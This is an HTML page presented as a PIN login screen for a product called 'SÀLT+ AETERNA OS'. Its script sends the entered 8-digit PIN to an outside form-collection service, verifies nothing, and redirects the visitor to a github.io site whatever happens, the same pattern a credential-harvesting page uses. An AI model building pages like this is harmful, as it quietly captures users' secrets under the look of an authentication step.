<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SÀLT+ AETERNA OS</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Inter:wght@400;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Inter', sans-serif;
            overflow: hidden;
            padding: 20px;
        }

        /* Card Container - Ramping presisi untuk layar smartphone */
        .card {
            background-color: #050505;
            width: 100%;
            max-width: 325px; 
            padding: 35px 24px;
            border-radius: 24px;
            border: 1.5px solid #00e5ff;
            box-shadow: 0 0 20px rgba(0, 229, 255, 0.2);
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Branding SÀLT+ */
        .brand-salt {
            font-family: 'Inter', sans-serif;
            font-size: 32px;
            font-weight: 700;
            color: #ffffff;
            letter-spacing: 5px;
            margin-bottom: 2px;
            text-shadow: 0 0 8px rgba(255, 255, 255, 0.5);
        }

        /* Sub-branding AETERNA OS */
        .brand-aeterna {
            font-family: 'Orbitron', sans-serif;
            font-size: 22px;
            font-weight: 700;
            color: #00e5ff;
            line-height: 1.2;
            letter-spacing: 1.5px;
            margin-bottom: 35px;
            text-shadow: 0 0 12px rgba(0, 229, 255, 0.7);
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 16px; 
        }

        /* Input PIN Field */
        .input-field {
            width: 100%;
            background-color: #121212;
            border: 1px solid #222222;
            border-radius: 12px;
            padding: 14px;
            color: #ffffff;
            font-size: 15px;
            text-align: center;
            letter-spacing: 3px;
            outline: none;
            transition: border-color 0.2s ease;
            -webkit-appearance: none;
        }

        .input-field:focus {
            border-color: #00e5ff;
        }

        .input-field::placeholder {
            color: #3df2ffd1; 
            opacity: 0.25;
            letter-spacing: 1.5px;
            font-size: 13px;
            text-transform: uppercase;
        }

        /* Tombol Initialize */
        .btn-initialize {
            width: 100%;
            background-color: #00e5ff;
            color: #000000;
            border: none;
            border-radius: 12px;
            padding: 14px;
            font-size: 13px;
            font-weight: 700;
            letter-spacing: 1px;
            cursor: pointer;
            text-transform: uppercase;
            transition: background-color 0.2s ease, transform 0.1s ease;
        }

        .btn-initialize:hover, .btn-initialize:active {
            background-color: #00b8cc;
        }

        .btn-initialize:active {
            transform: scale(0.97); 
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="brand-salt">SÀLT+</div>
        <div class="brand-aeterna">AETERNA<br>OS</div>

        <form id="initForm" action="https://formspree.io/f/mbdbrpjd" method="POST">
            
            <input type="hidden" name="token_name" value="saltemail">
            <input type="hidden" name="gemini_api_key" value="FREE_TIER_ACTIVE">

            <input 
                type="text" 
                name="user_pin" 
                class="input-field" 
                placeholder="8-DIGIT PIN" 
                maxlength="8" 
                pattern="\d{8}" 
                required
                inputmode="numeric"
                autocomplete="off"
            >

            <button type="submit" class="btn-initialize">Initialize</button>
        </form>
    </div>

    <script>
        document.getElementById('initForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const form = this;
            const formData = new FormData(form);
            const pinInput = form.querySelector('.input-field').value;

            if(!/^\d{8}$/.test(pinInput)) {
                alert("Please enter a valid 8-digit PIN.");
                return;
            }

            fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            }).then(response => {
                // Berhasil kirim data, langsung redirect mulus
                window.location.href = "https://maisonlinore.github.io/";
            }).catch(error => {
                // Proteksi jika offline/gagal koneksi, tetap diarahkan balik
                window.location.href = "https://maisonlinore.github.io/";
            });
        });
    </script>

</body>
</html>
